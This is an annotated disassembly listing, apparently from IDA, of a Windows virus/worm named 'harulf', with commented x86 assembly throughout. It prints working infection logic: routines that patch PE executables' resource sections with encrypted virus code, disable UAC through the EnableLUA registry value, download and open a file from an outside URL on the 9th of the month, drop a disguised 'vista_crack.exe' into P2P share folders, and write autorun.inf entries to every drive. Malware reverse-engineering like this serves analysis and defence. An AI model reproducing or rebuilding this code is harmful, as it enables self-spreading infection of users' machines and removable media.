.text:00401D03                 push    0               ; push 0 (FALSE) onto stack
.text:00401D05                 push    eax             ; push handle onto stack
.text:00401D06                 call    ss:dword_401747[ebp] ; call EndUpdateResource func and write the changes
.text:00401D0C                 or      eax, eax        ; success in ending?
.text:00401D0E                 jz      exit_infect     ; no so exit
.text:00401D14                 xor     eax, eax        ; yes so reset eax to 0
.text:00401D16                 push    eax             ; push 0 onto stack
.text:00401D17                 push    eax             ; push 0 onto stack
.text:00401D18                 push    3               ; push 3 onto stack
.text:00401D1A                 push    eax             ; push 0 onto stack
.text:00401D1B                 push    2               ; push 2 onto stack
.text:00401D1D                 push    0C0000000h      ; push 0C0000000h onto stack
.text:00401D22                 push    ss:dword_401A1A[ebp] ; push virus file handle onto stack
.text:00401D28                 call    ss:dword_40172F[ebp] ; call createFile func with the respective params that were pushed onto stack
.text:00401D2E                 or      eax, eax        ; valid file handle returned?
.text:00401D30                 jz      loc_40138D      ; no so exit
.text:00401D36                 mov     ss:dword_401A2A[ebp], eax ; save file handle to mem
.text:00401D3C                 push    0               ; push 0 (does not require high-order dw) onto stack
.text:00401D3E                 push    eax             ; push file handle onto stack
.text:00401D3F                 call    ss:dword_40174F[ebp] ; call getFileSize given the file handle
.text:00401D45                 or      eax, eax        ; valid dw of file size returned?
.text:00401D47                 jz      exit_infect     ; no so exit
.text:00401D4D                 mov     ss:dword_401A32[ebp], eax ; yes so save file size to mem
.text:00401D53                 push    eax             ; push file size onto stack
.text:00401D54                 push    0               ; push 0 (allocate fixed mem) onto stack
.text:00401D56                 call    ss:dword_401753[ebp] ; call GlobalAlloc()
.text:00401D5C                 or      eax, eax        ; valid pointer returned?
.text:00401D5E                 jz      exit_infect     ; no so exit
.text:00401D64                 mov     ss:dword_401A2E[ebp], eax ; yes so save pointer to mem
.text:00401D6A                 push    0               ; push 0 onto stack
.text:00401D6C                 mov     eax, offset dword_401A36 ; eax = module handle
.text:00401D71                 add     eax, ebp        ; eax = module handle + frame pointer
.text:00401D73                 push    eax             ; push eax onto stack
.text:00401D74                 push    ss:dword_401A32[ebp] ; push virus size onto stack
.text:00401D7A                 push    ss:dword_401A2E[ebp] ; push pointer to allocated mem onto stack
.text:00401D80                 push    ss:dword_401A2A[ebp] ; push file handle onto stack
.text:00401D86                 call    ss:dword_40173B[ebp] ; call readFile with the params pushed onto stack
.text:00401D8C                 or      eax, eax        ; were you able to read file?
.text:00401D8E                 jz      exit_infect     ; no so exit
.text:00401D94                 mov     esi, ss:dword_401A2E[ebp] ; esi = pointer to allocated mem
.text:00401D9A                 cmp     word ptr [esi], 5A4Dh ; is file mz type?
.text:00401D9F                 jnz     exit_infect     ; no so exit
.text:00401DA5                 add     esi, [esi+3Ch]  ; go to next section
.text:00401DA8                 cmp     word ptr [esi], 4550h ; is the section the pe header?
.text:00401DAD                 jnz     exit_infect     ; no exit
.text:00401DB3                 push    esi             ; save esi onto stack
.text:00401DB4                 xor     ecx, ecx        ; ecx = 0
.text:00401DB6                 xor     ebx, ebx        ; ebx = 0
.text:00401DB8                 mov     bx, [esi+14h]   ; bx = size of optional header
.text:00401DBC                 mov     cx, [esi+6]     ; cx = no of sections
.text:00401DC0                 add     esi, 18h        ; esi is at start of optional header
.text:00401DC3                 add     esi, ebx        ; add size of the optional header
.text:00401DC5                 mov     edx, esi        ; edx = esi
.text:00401DC7                 push    esi             ; push esi onto stack
.text:00401DC8                 push    ecx             ; push ecx onto stack
.text:00401DC9                 call    sub_401B15      ; find 1st sector
.text:00401DCE                 mov     ss:dword_401A26[ebp], eax ; save pointer to first section header
.text:00401DD4                 pop     ecx             ; restore ecx
.text:00401DD5                 pop     esi             ; restore esi
.text:00401DD6                 xor     ebx, ebx        ; ebx = 0
.text:00401DD8
.text:00401DD8 loc_401DD8:                             ; CODE XREF: exe_file+257\u2193j
.text:00401DD8                 cmp     dword ptr [esi], 7273722Eh ; check if .rsr format
.text:00401DDE                 jz      short loc_401DE7 ; yes so jump here
.text:00401DE0                 add     esi, 28h ; '('  ; esi = addr of entry point
.text:00401DE3                 loop    loc_401DD8      ; loop and find .rsr
.text:00401DE5                 jmp     short exit_infect ; not found so exit
.text:00401DE7 ; ---------------------------------------------------------------------------
.text:00401DE7
.text:00401DE7 loc_401DE7:                             ; CODE XREF: exe_file+252\u2191j
.text:00401DE7                 mov     dword ptr [esi+24h], 0C0000040h ; reading and writing characteristics of the new section
.text:00401DEE                 mov     ecx, [esi+10h]  ; ecx = ordinal base
.text:00401DF1                 mov     esi, [esi+14h]  ; esi = size of optional header
.text:00401DF4                 add     esi, ss:dword_401A2E[ebp] ; esi = pointer to allocated mem + size of optional header
.text:00401DFA                 push    ecx             ; save ordinal base onto stack
.text:00401DFB
.text:00401DFB loc_401DFB:                             ; CODE XREF: exe_file+27A\u2193j
.text:00401DFB                 mov     edx, dword ptr ss:start[ebp] ; edx = start offset
.text:00401E01                 cmp     [esi], edx      ; search for the virus start addr within the allocated memory
.text:00401E03                 jz      short loc_401E08 ; virus start addr found so jump here
.text:00401E05                 inc     esi             ; not found so do a byte by byte search
.text:00401E06                 loop    loc_401DFB      ; loop until virus start offset is found
.text:00401E08
.text:00401E08 loc_401E08:                             ; CODE XREF: exe_file+277\u2191j
.text:00401E08                 pusha                   ; save all general registers to stack
.text:00401E09                 call    encrypt_2       ; 2nd encryption
.text:00401E0E                 popa                    ; restore all general registers
.text:00401E0F                 pop     edx             ; restore edx
.text:00401E10                 sub     edx, ecx        ; edx -= ecx
.text:00401E12                 pop     edi             ; restore edi
.text:00401E13                 add     edx, [edi+88h]  ; edx += va resourceDirectory
.text:00401E19                 add     edx, [edi+34h]  ; edx += image base
.text:00401E1C                 mov     ss:dword_401A56[ebp], edx ; save edx into memory
.text:00401E22                 mov     eax, ss:dword_401A26[ebp] ; eax = temp offset
.text:00401E28                 call    sub_401B3B
.text:00401E2D                 push    0               ; push 0 onto stack
.text:00401E2F                 push    0               ; push 0 onto stack
.text:00401E31                 push    0               ; push 0 (FILE_BEGIN) onto stack
.text:00401E33                 push    ss:dword_401A2A[ebp] ; push virus file handle onto stack
.text:00401E39                 call    ss:dword_401757[ebp] ; call setFilePointer
.text:00401E3F                 push    0               ; push 0 onto stack
.text:00401E41                 mov     eax, offset dword_401A36 ; eax = module handle
.text:00401E46                 add     eax, ebp        ; eax = module handle + frame pointer
.text:00401E48                 push    eax             ; push module handle + frame pointer onto stack
.text:00401E49                 push    ss:dword_401A32[ebp] ; push virus size onto stack
.text:00401E4F                 push    ss:dword_401A2E[ebp] ; push virus memory handle onto stack
.text:00401E55                 push    ss:dword_401A2A[ebp] ; push virus file handle onto stack
.text:00401E5B                 call    ss:dword_401737[ebp] ; call writeFile func
.text:00401E61                 retn                    ; return
.text:00401E62 ; ---------------------------------------------------------------------------
.text:00401E62
.text:00401E62 exit_infect:                            ; CODE XREF: exe_file-5\u2191j
.text:00401E62                                         ; exe_file+14\u2191j ...
.text:00401E62                 retn                    ; return
.text:00401E62 exe_file        endp ; sp-analysis failed
.text:00401E62
.text:00401E62 ; ---------------------------------------------------------------------------
.text:00401E63 aYouNeedAdminis db 'You need Administrator Privilege to run this Application',0
.text:00401E63                                         ; DATA XREF: is_user_admin+A\u2193o
.text:00401E9C aError          db 'Error',0            ; DATA XREF: is_user_admin+10\u2193o
.text:00401EA2 aInitializesrwl db 'InitializeSRWLock',0
.text:00401EA2                                         ; DATA XREF: is_user_admin:loc_401ED7\u2193o
.text:00401EB4
.text:00401EB4 ; =============== S U B R O U T I N E =======================================
.text:00401EB4
.text:00401EB4
.text:00401EB4 is_user_admin   proc near               ; CODE XREF: start:loc_401332\u2191p
.text:00401EB4                 call    ss:dword_40180B[ebp] ; call isUserAnAdmin func
.text:00401EBA                 or      eax, eax        ; is user an admin?
.text:00401EBC                 jnz     short loc_401ED7 ; yes so jump here
.text:00401EBE                 lea     eax, aYouNeedAdminis[ebp] ; "You need Administrator Privilege to run"...
.text:00401EC4                 lea     edx, aError[ebp] ; "Error"
.text:00401ECA                 push    10h             ; 10h = MB_ICONERROR
.text:00401ECC                 push    edx             ; push caption "Error"
.text:00401ECD                 push    eax             ; push text "You need admin priv..."
.text:00401ECE                 push    0               ; push 0 (hwnd)
.text:00401ED0                 call    ss:dword_4013CD[ebp] ; call MessageBoxA func
.text:00401ED6                 retn                    ; return
.text:00401ED7 ; ---------------------------------------------------------------------------
.text:00401ED7
.text:00401ED7 loc_401ED7:                             ; CODE XREF: is_user_admin+8\u2191j
.text:00401ED7                 lea     eax, aInitializesrwl[ebp] ; "InitializeSRWLock"
.text:00401EDD                 push    eax             ; push eax onto stack
.text:00401EDE                 push    ss:dword_4013EA[ebp] ; push kernel base offset onto stack
.text:00401EE4                 call    ss:dword_401449[ebp] ; call getProcAddr func
.text:00401EEA                 or      eax, eax        ; valid addr returned? Are we on vista?
.text:00401EEC                 jz      short locret_401EF4 ; no so jump here
.text:00401EEE                 call    sub_401F45      ; call fix_vista
.text:00401EF3                 retn
.text:00401EF4 ; ---------------------------------------------------------------------------
.text:00401EF4
.text:00401EF4 locret_401EF4:                          ; CODE XREF: is_user_admin+38\u2191j
.text:00401EF4                 retn                    ; return to caller
.text:00401EF4 is_user_admin   endp ; sp-analysis failed
.text:00401EF4
.text:00401EF4 ; ---------------------------------------------------------------------------
.text:00401EF5 aSoftwareMicros db 'Software\Microsoft\Windows\CurrentVersion\Policies\System',0
.text:00401EF5                                         ; DATA XREF: sub_401F45+B\u2193o
.text:00401F2F aEnablelua      db 'EnableLUA',0        ; DATA XREF: sub_401F45+37\u2193o
.text:00401F39 dword_401F39    dd 4                    ; DATA XREF: sub_401F45+26\u2193r
.text:00401F3D byte_401F3D     db 3 dup(0)             ; DATA XREF: sub_401F45+2C\u2193o
.text:00401F40                 db 0
.text:00401F41 dword_401F41    dd 0                    ; DATA XREF: sub_401F45\u2193o
.text:00401F41                                         ; sub_401F45+1D\u2193r ...
.text:00401F45
.text:00401F45 ; =============== S U B R O U T I N E =======================================
.text:00401F45
.text:00401F45
.text:00401F45 sub_401F45      proc near               ; CODE XREF: is_user_admin+3A\u2191p
.text:00401F45                 lea     eax, dword_401F41[ebp] ; eax = register handle
.text:00401F4B                 push    eax             ; push handle onto stack
.text:00401F4C                 push    2               ; push 2 (KEY_SET_VALUE) onto stack
.text:00401F4E                 push    0               ; push 0 onto stack
.text:00401F50                 lea     eax, aSoftwareMicros[ebp] ; "Software\\Microsoft\\Windows\\CurrentVe"...
.text:00401F56                 push    eax             ; push eax = LUA offset onto stack
.text:00401F57                 push    80000002h       ; push 80000002h (HKEY_LOCAL_MACHINE) onto stack
.text:00401F5C                 call    ss:dword_4017E5[ebp] ; call RegOpenKey func
.text:00401F62                 cmp     dword_401F41, 0 ; function succeeded?
.text:00401F69                 jz      short locret_401F9B ; yes so jump here and return
.text:00401F6B                 push    ss:dword_401F39[ebp] ; push sz_key onto stack
.text:00401F71                 lea     eax, byte_401F3D[ebp] ; eax = offset value
.text:00401F77                 push    eax             ; push offset onto stack
.text:00401F78                 push    4               ; push 4 (REG_DWORD) onto stack
.text:00401F7A                 push    0               ; push 0 onto stack
.text:00401F7C                 lea     eax, aEnablelua[ebp] ; "EnableLUA"
.text:00401F82                 push    eax             ; push eax (EnableLUA) addr onto stack
.text:00401F83                 push    ss:dword_401F41[ebp] ; push register handle onto stack
.text:00401F89                 call    ss:dword_4017ED[ebp] ; call RegSetValueEx func
.text:00401F8F                 push    ss:dword_401F41[ebp] ; push reg handle onto stack
.text:00401F95                 call    ss:dword_4017F1[ebp] ; call RegCloseKey func
.text:00401F9B
.text:00401F9B locret_401F9B:                          ; CODE XREF: sub_401F45+24\u2191j
.text:00401F9B                 retn                    ; return
.text:00401F9B sub_401F45      endp
.text:00401F9B
.text:00401F9B ; ---------------------------------------------------------------------------
.text:00401F9C aHttpWwwSaddams db 'http://www.saddamsfamily.com/sf-logony.jpg',0
.text:00401F9C                                         ; DATA XREF: saddam_family+52\u2193o
.text:00401FC7 aCSaddamsfamily db 'c:\saddamsfamily.jpg',0
.text:00401FC7                                         ; DATA XREF: saddam_family+4B\u2193o
.text:00401FDC aExplorerExeCSa db 'explorer.exe "c:\saddamsfamily.jpg"',0
.text:00401FDC                                         ; DATA XREF: saddam_family+69\u2193o
.text:00402000 aUrldownloadtof db 'URLDownloadToFileA',0
.text:00402000                                         ; DATA XREF: saddam_family+39\u2193o
.text:00402013 aUrlmonDll      db 'urlmon.dll',0       ; DATA XREF: saddam_family+28\u2193o
.text:0040201E                 align 10h
.text:00402020                 db 2 dup(0)
.text:00402022 word_402022     dw 0                    ; DATA XREF: saddam_family+2\u2193o
.text:00402022                                         ; saddam_family+1B\u2193o
.text:00402024                 db 2 dup(0)
.text:00402026 aDd             db 'dd',0               ; DATA XREF: saddam_family+9\u2193o
.text:00402029
.text:00402029 ; =============== S U B R O U T I N E =======================================
.text:00402029
.text:00402029
.text:00402029 saddam_family   proc near               ; CODE XREF: start+31D\u2191p
.text:00402029                                         ; start+337\u2191p
.text:00402029                 push    4               ; push 4 (cchDate onto stack)
.text:0040202B                 lea     eax, word_402022[ebp] ; eax = pointer to buffer for formatted date string
.text:00402031                 push    eax             ; push pointer (lpDateStr) onto stack
.text:00402032                 lea     eax, aDd[ebp]   ; "dd"
.text:00402038                 push    eax             ; push eax (pointer to a format picture string) onto stack
.text:00402039                 xor     eax, eax        ; eax = 0
.text:0040203B                 push    eax             ; push 0 (lpDate) onto stack
.text:0040203C                 push    eax             ; push 0 (dwFLAGS) onto stack
.text:0040203D                 push    eax             ; push 0(Locale) onto stack
.text:0040203E                 call    ss:dword_40175F[ebp] ; call GetDateFormat func
.text:00402044                 lea     eax, word_402022[ebp] ; eax = formatted date string that was returned from the getDateFormat func
.text:0040204A                 cmp     word ptr [eax], 3930h ; is it the 9th date of the month?
.text:0040204F                 jnz     short locret_40209F ; no so exit
.text:00402051                 lea     eax, aUrlmonDll[ebp] ; "urlmon.dll"
.text:00402057                 push    eax             ; push eax = urlmon offset onto stack
.text:00402058                 call    ss:dword_40177B[ebp] ; call LoadLibrary func
.text:0040205E                 or      eax, eax        ; valid handle returned?
.text:00402060                 jz      short locret_40209F ; no so exit
.text:00402062                 lea     edx, aUrldownloadtof[ebp] ; "URLDownloadToFileA"
.text:00402068                 push    edx             ; push URLdownloadToFile offset onto stack
.text:00402069                 push    eax             ; push LoadLibrary handle onto stack
.text:0040206A                 call    ss:dword_401449[ebp] ; call GetProcAddr func
.text:00402070                 xor     edx, edx        ; edx = 0
.text:00402072                 push    edx             ; push 0 onto stack
.text:00402073                 push    edx             ; push 0 onto stack
.text:00402074                 lea     ebx, aCSaddamsfamily[ebp] ; "c:\\saddamsfamily.jpg"
.text:0040207A                 push    ebx             ; push ebx = saddam family.jpg onto stack
.text:0040207B                 lea     ebx, aHttpWwwSaddams[ebp] ; "http://www.saddamsfamily.com/sf-logony."...
.text:00402081                 push    ebx             ; PUSH URL onto stack
.text:00402082                 push    edx             ; push 0 onto stack
.text:00402083                 call    eax             ; call the URLdownload func
.text:00402085                 push    0BB8h           ; push 0BB8h = 3000 onto stack
.text:0040208A                 call    ss:dword_401763[ebp] ; call Sleep func (sleep for 3000 ms)
.text:00402090                 push    5               ; push 5 (SW_SHOW -> Activates the window and displays it in its current size and position.) onto stack
.text:00402092                 lea     eax, aExplorerExeCSa[ebp] ; "explorer.exe \"c:\\saddamsfamily.jpg\""
.text:00402098                 push    eax             ; push eax = explore.exe \... onto stack
.text:00402099                 call    ss:dword_40179F[ebp] ; call WinExec func
.text:0040209F
.text:0040209F locret_40209F:                          ; CODE XREF: saddam_family+26\u2191j
.text:0040209F                                         ; saddam_family+37\u2191j
.text:0040209F                 retn                    ; return
.text:0040209F saddam_family   endp
.text:0040209F
.text:0040209F ; ---------------------------------------------------------------------------
.text:004020A0 aCProgramFilesK db 'c:\Program Files\Kazaa Lite\My Shared Folder\vista_crack.exe',0
.text:004020A0                                         ; DATA XREF: p2p_share_folders\u2193o
.text:004020DD aCProgramFilesK_0 db 'c:\Program Files\Kazaa\My Shared Folder\vista_crack.exe',0
.text:00402115 aCProgramFilesE db 'c:\Program Files\Edonkey2000\Incoming\vista_crack.exe',0
.text:0040214B aCProgramFilesI db 'c:\Program Files\Icq\Shared Files\vista_crack.exe',0
.text:0040217D aCProgramFilesE_0 db 'c:\Program Files\emule\incoming\vista_crack.exe',0
.text:004021AD aCProgramFilesG db 'c:\Program Files\Gnucleus\Downloads\Incoming\vista_crack.exe',0
.text:004021EA aCProgramFilesK_1 db 'c:\Program Files\KMD\My Shared Folder\vista_crack.exe',0
.text:00402220 aCProgramFilesL db 'c:\Program Files\Limewire\Shared\vista_crack',0
.text:0040224D ;drop in p2p default (harcoded) share folders
.text:0040224D
.text:0040224D ; =============== S U B R O U T I N E =======================================
.text:0040224D
.text:0040224D
.text:0040224D p2p_share_folders proc near             ; CODE XREF: start+322\u2191p
.text:0040224D                                         ; start+327\u2191p ...
.text:0040224D                 lea     esi, aCProgramFilesK[ebp] ; "c:\\Program Files\\Kazaa Lite\\My Share"...
.text:00402253                 push    8               ; push size onto stack. esi above has destination folder to drop p2p
.text:00402255                 pop     ecx             ; restore ecx
.text:00402256
.text:00402256 loc_402256:                             ; CODE XREF: p2p_share_folders+25\u2193j
.text:00402256                 push    ecx             ; push ecx onto stack
.text:00402257                 push    esi             ; push destination folder onto stack
.text:00402258                 push    0               ; push (BOOL bFailIfExists = FALSE)
.text:0040225A                 push    esi             ; push newFileName onto stack
.text:0040225B                 push    ss:dword_40239D[ebp] ; push existing file name onto stack
.text:00402261                 call    ss:dword_40178B[ebp] ; call CopyFile func. Overwrite if file exists
.text:00402267                 pop     esi             ; restore esi
.text:00402268
.text:00402268 loc_402268:                             ; CODE XREF: p2p_share_folders+21\u2193j
.text:00402268                 cmp     byte ptr [esi], 0 ; all files copied in folder?
.text:0040226B                 jz      short loc_402270 ; yes so go to next folder
.text:0040226D                 inc     esi             ; no so go to next file
.text:0040226E                 jmp     short loc_402268 ; copy all files in folder
.text:00402270 ; ---------------------------------------------------------------------------
.text:00402270
.text:00402270 loc_402270:                             ; CODE XREF: p2p_share_folders+1E\u2191j
.text:00402270                 inc     esi             ; go to next folder
.text:00402271                 pop     ecx             ; restore ecx
.text:00402272                 loop    loc_402256      ; copy files in folder
.text:00402274                 retn                    ; return
.text:00402274 p2p_share_folders endp
.text:00402274
.text:00402274 ; ---------------------------------------------------------------------------
.text:00402275 unk_402275      db  61h ; a             ; DATA XREF: autorun_harulf+8\u2193o
.text:00402275                                         ; sub_40230C+24\u2193o
.text:00402276                 db  3Ah ; :
.text:00402277                 db  5Ch ; \
.text:00402278                 db 0
.text:00402279 ;drop an autorun with 'harulf.exe' on every writeable drive
.text:00402279
.text:00402279 ; =============== S U B R O U T I N E =======================================
.text:00402279
.text:00402279
.text:00402279 autorun_harulf  proc near               ; CODE XREF: start+32C\u2191p
.text:00402279                                         ; start+346\u2191p
.text:00402279                 call    ss:dword_40172B[ebp] ; call GetLogicalDrives func
.text:0040227F                 xor     edx, edx        ; edx = 0
.text:00402281                 lea     edx, unk_402275[ebp] ; edx = root offset
.text:00402287                 xor     ecx, ecx        ; ecx = 0
.text:00402289
.text:00402289 loc_402289:                             ; CODE XREF: autorun_harulf+24\u2193j
.text:00402289                 bt      eax, ecx        ; copy the bit to the carry flag. (Checking which drives are currently available) Note: return value in eax is a bitmask representing the currently available disk drives
.text:0040228C                 jnb     short loc_402295 ; disk unable to be to written to so check next disk
.text:0040228E                 pusha                   ; save all general purpose registers
.text:0040228F                 call    sub_40230C      ; disk is available so infect
.text:00402294                 popa                    ; restore all general purpose registers
.text:00402295
.text:00402295 loc_402295:                             ; CODE XREF: autorun_harulf+13\u2191j
.text:00402295                 inc     byte ptr [edx]  ; increment edx pointer
.text:00402297                 inc     ecx             ; check if next disk is available
.text:00402298                 cmp     ecx, 21h ; '!'  ; is this the final disk to check if it is available
.text:0040229B                 ja      short locret_40229F ; all disk written to so return
.text:0040229D                 jmp     short loc_402289 ; no so check if this disk is available to be written to
.text:0040229F ; ---------------------------------------------------------------------------
.text:0040229F
.text:0040229F locret_40229F:                          ; CODE XREF: autorun_harulf+22\u2191j
.text:0040229F                 retn                    ; return
.text:0040229F autorun_harulf  endp
.text:0040229F
.text:0040229F ; ---------------------------------------------------------------------------
.text:004022A0 aAutorunOpenHar db '[autorun]',0Dh,0Ah  ; DATA XREF: sub_40230C+6F\u2193o
.text:004022A0                 db 'open=harulf.exe',0Dh,0Ah
.text:004022A0                 db 'shell\open\command=harulf.exe',0Dh,0Ah
.text:004022A0                 db 'shell\open\default=1',0
.text:004022F0 aAutorunInf     db 'autorun.inf',0      ; DATA XREF: sub_40230C+58\u2193o
.text:004022FC aHarulfExe      db '\harulf.exe',0      ; DATA XREF: sub_40230C+38\u2193o
.text:00402308 dword_402308    dd 0                    ; DATA XREF: sub_40230C+D\u2193w
.text:00402308                                         ; sub_40230C+13\u2193r ...
.text:0040230C
.text:0040230C ; =============== S U B R O U T I N E =======================================
.text:0040230C
.text:0040230C
.text:0040230C sub_40230C      proc near               ; CODE XREF: autorun_harulf+16\u2191p
.text:0040230C                 push    100h            ; push 100h = 256 bytes size onto stack
.text:00402311                 push    0               ; push 0 (allocate fixed mem) onto stack
.text:00402313                 call    ss:dword_401753[ebp] ; call GlobalAlloc
.text:00402319                 mov     ss:dword_402308[ebp], eax ; save pointer to buffer
.text:0040231F                 push    ss:dword_402308[ebp] ; push pointer to buffer onto stack
.text:00402325                 push    100h            ; push size of buffer onto stack
.text:0040232A                 call    ss:dword_40178F[ebp] ; call GetCurrentDirectory (string is stored in buffer)
.text:00402330                 lea     esi, unk_402275[ebp] ; esi = root offset
.text:00402336                 push    esi             ; push root offset onto stack
.text:00402337                 call    ss:dword_401793[ebp] ; call SetCurrentDirectory func
.text:0040233D                 call    infect_exe      ; find .exe file in directory and infect them
.text:00402342                 push    0               ; push (BOOL bFailIfExists = FALSE)
.text:00402344                 lea     eax, aHarulfExe[ebp] ; "\\harulf.exe"
.text:0040234A                 push    eax             ; push harulf.exe name onto stack
.text:0040234B                 push    ss:dword_40239D[ebp] ; push existing file name onto stack
.text:00402351                 call    ss:dword_40178B[ebp] ; call CopyFile func. Overwrite if file exists
.text:00402357                 xor     eax, eax        ; eax = 0
.text:00402359                 push    eax             ; push 0 (TemplateFile) onto stack
.text:0040235A                 push    eax             ; push 0 (Flags and sttributes) onto stack
.text:0040235B                 push    2               ; push 2 (CREATE_ALWAYS) onto stack
.text:0040235D                 push    eax             ; push 0 (NULL SECURITY ATTRIBUTES) onto stack
.text:0040235E                 push    eax             ; push 0 (share mode = 0) onto stack
.text:0040235F                 push    40000000h       ; push 40000000h (DesiredAccess) onto stack
.text:00402364                 lea     eax, aAutorunInf[ebp] ; "autorun.inf"
.text:0040236A                 push    eax             ; push file name "autorun.inf" onto stack
.text:0040236B                 call    ss:dword_40172F[ebp] ; call CreateFile func
.text:00402371                 push    eax             ; save handle of created file onto stack
.text:00402372                 push    0               ; push 0 onto stack
.text:00402374                 mov     edx, esp        ; edx = stack pointer
.text:00402376                 push    0               ; push 0 onto stack
.text:00402378                 push    edx             ; push edx onto stack
.text:00402379                 push    50h ; 'P'       ; push .inf file size onto stack
.text:0040237B                 lea     edx, aAutorunOpenHar[ebp] ; "[autorun]\r\nopen=harulf.exe\r\nshell\\"...
.text:00402381                 push    edx             ; push edx = autorun command onto stack
.text:00402382                 push    eax             ; push handle of created file onto stack
.text:00402383                 call    ss:dword_401737[ebp] ; call WriteFile func
.text:00402389                 pop     eax             ; restore eax
.text:0040238A                 call    ss:dword_401733[ebp] ; call CloseHandle func
.text:00402390                 push    ss:dword_402308[ebp] ; push pointer to buffer onto stack
.text:00402396                 call    ss:dword_401793[ebp] ; call SetCurrentDirectory func
.text:0040239C                 retn                    ; return
.text:0040239C sub_40230C      endp
.text:0040239C
.text:0040239C ; ---------------------------------------------------------------------------
.text:0040239D dword_40239D    dd 0                    ; DATA XREF: p2p_share_folders+E\u2191r
.text:0040239D                                         ; sub_40230C+3F\u2191r ...
.text:004023A1
.text:004023A1 ; =============== S U B R O U T I N E =======================================
.text:004023A1
.text:004023A1
.text:004023A1 get_name        proc near               ; CODE XREF: start+30F\u2191p
.text:004023A1                 push    100h            ; push 100h = 256 bytes size onto stack
.text:004023A6                 push    0               ; push 0 (allocate fixed mem) onto stack
.text:004023A8                 call    ss:dword_401753[ebp] ; call GlobalAlloc
.text:004023AE                 mov     ss:dword_40239D[ebp], eax ; save pointer to buffer
.text:004023B4                 push    100h            ; push 100h = 256 bytes size onto stack
.text:004023B9                 push    ss:dword_40239D[ebp] ; push pointer to buffer onto stack
.text:004023BF                 push    0               ; push hModule = 0 onto stack. GetModuleFileName retrieves the path of the executable file of the current process.
.text:004023C1                 call    ss:dword_401787[ebp] ; call GetModuleFileName func
.text:004023C7                 mov     esi, ss:dword_40239D[ebp] ; esi = path name
.text:004023CD                 push    esi             ; push path name onto stack
.text:004023CE                 call    get_size_of_string ; get size of path name string
.text:004023D3                 pop     esi             ; restore esi
.text:004023D4                 add     esi, ecx        ; esi + ecx
.text:004023D6                 mov     ecx, 8          ; ecx = 8
.text:004023DB                 xor     eax, eax        ; eax = 0
.text:004023DD
.text:004023DD loc_4023DD:                             ; CODE XREF: get_name+44\u2193j
.text:004023DD                 dec     esi             ; esi --
.text:004023DE                 cmp     word ptr [esi], 6168h ; check if file name matches harulf
.text:004023E3                 jz      short loc_4023E8 ; matched so jump here
.text:004023E5                 loop    loc_4023DD      ; loop until filename matches
.text:004023E7                 retn
.text:004023E8 ; ---------------------------------------------------------------------------
.text:004023E8
.text:004023E8 loc_4023E8:                             ; CODE XREF: get_name+42\u2191j
.text:004023E8                 dec     eax             ; eax --
.text:004023E9                 retn                    ; return
.text:004023E9 get_name        endp
.text:004023E9
.text:004023E9 ; ---------------------------------------------------------------------------
.text:004023EA aExplorer       db 'explorer ',0        ; DATA XREF: run_explorer\u2193o
.text:004023F4
.text:004023F4 ; =============== S U B R O U T I N E =======================================
.text:004023F4
.text:004023F4
.text:004023F4 run_explorer    proc near               ; CODE XREF: start+318\u2191p
.text:004023F4                 lea     esi, aExplorer[ebp] ; "explorer "
.text:004023FA                 mov     edi, esp        ; edi = esp (stack pointer)
.text:004023FC                 sub     edi, 200h       ; allocate size of 512 bytes
.text:00402402                 push    edi             ; push edi onto stack
.text:00402403                 mov     ecx, 9          ; ecx = size of explorer cmd - 1
.text:00402408                 rep movsb               ; copy explorer command into function
.text:0040240A                 mov     ecx, 2          ; ecx = 2
.text:0040240F                 mov     esi, ss:dword_40239D[ebp] ; esi = file name
.text:00402415                 rep movsb               ; copy file name into function
.text:00402417                 mov     byte ptr [edi+1], 0 ; null the pointer
.text:0040241B                 mov     ecx, 0Bh        ; ecx = size of explorer cmd + 1
.text:00402420                 push    ecx             ; push ecx onto stack
.text:00402421                 push    ecx             ; Allocate 11 bytes
.text:00402422                 push    0               ; push 0 onto stack (Allocate fixed mem)
.text:00402424                 call    dword_401753    ; Call GlobalAlloc func
.text:0040242A                 pop     ecx             ; restore ecx
.text:0040242B                 pop     esi             ; restore esi
.text:0040242C                 mov     edi, eax        ; edi = pointer to allocated mem
.text:0040242E                 rep movsb               ; copy to buffer
.text:00402430                 push    5               ; push 5 (SW_SHOW)onto stack
.text:00402432                 push    eax             ; push pointer to buffer onto stack
.text:00402433                 call    ss:dword_40179F[ebp] ; call WinExec func
.text:00402439                 retn                    ; return
.text:00402439 run_explorer    endp
.text:00402439
.text:0040243A
.text:0040243A ; =============== S U B R O U T I N E =======================================
.text:0040243A
.text:0040243A
.text:0040243A get_size_of_string proc near            ; CODE XREF: infect_exe+4A\u2191p
.text:0040243A                                         ; infect_exe+8F\u2191p ...
.text:0040243A                 xor     ecx, ecx        ; ecx = 0
.text:0040243C
.text:0040243C loc_40243C:                             ; CODE XREF: get_size_of_string+9\u2193j
.text:0040243C                 cmp     byte ptr [esi], 0 ; eof string?
.text:0040243F                 jz      short locret_402445 ; yes so return
.text:00402441                 inc     esi             ; no so go to next char of string
.text:00402442                 inc     ecx             ; increment size of string counter
.text:00402443                 jmp     short loc_40243C ; loop until eof string
.text:00402445 ; ---------------------------------------------------------------------------
.text:00402445
.text:00402445 locret_402445:                          ; CODE XREF: get_size_of_string+5\u2191j
.text:00402445                 retn                    ; return
.text:00402445 get_size_of_string endp
.text:00402445
.text:00402446
.text:00402446 ; =============== S U B R O U T I N E =======================================
.text:00402446
.text:00402446
.text:00402446 random_number   proc near               ; CODE XREF: start+2FF\u2191p
.text:00402446                                         ; random_addr+7\u2193p
.text:00402446                 inc     ecx             ; ecx ++
.text:00402447                 push    ecx             ; push ecx onto stack
.text:00402448                 call    ss:dword_40179B[ebp] ; call GetTickCount func
.text:0040244E                 mov     ecx, eax        ; ecx = no. of millis since system was started
.text:00402450                 rdtsc                   ; Load the current value of the processor's time-stamp counter into the EDX:EAX registers.
.text:00402452                 xor     ecx, eax        ; get random number by xoring the no. of millis that passed with the second half of the time stamp counter value
.text:00402454                 xchg    eax, ecx        ; eax now has the random value
.text:00402455                 pop     ecx             ; restore ecx
.text:00402456
.text:00402456 loc_402456:                             ; CODE XREF: random_number+19\u2193j
.text:00402456                                         ; random_number+21\u2193j
.text:00402456                 push    ecx             ; push ecx onto stack
.text:00402457                 xor     edx, edx        ; edx = 0
.text:00402459                 div     ecx             ; random value / ecx
.text:0040245B                 xchg    eax, edx        ; eax = remainder of division
.text:0040245C                 pop     ecx             ; restore ecx
.text:0040245D                 cmp     eax, ecx        ; check if remainder > 4 (random number must be greater 0 but less than or equal to 4)
.text:0040245F                 ja      short loc_402456 ; yes so jump here
